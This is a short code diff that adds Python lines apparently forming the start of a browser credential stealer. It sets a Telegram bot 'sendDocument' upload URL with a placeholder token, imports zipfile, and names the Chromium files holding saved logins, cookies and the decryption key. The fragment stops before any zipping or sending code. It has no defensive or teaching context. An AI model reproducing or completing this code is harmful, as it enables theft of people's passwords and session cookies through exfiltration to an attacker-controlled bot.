@@ -1,0 +1,4 @@
+url = "https://api.telegram.org/bot000:AAAA/sendDocument"
+import zipfile
+p = "Default/Login Data"; c = "Cookies"; k = "Local State"
+
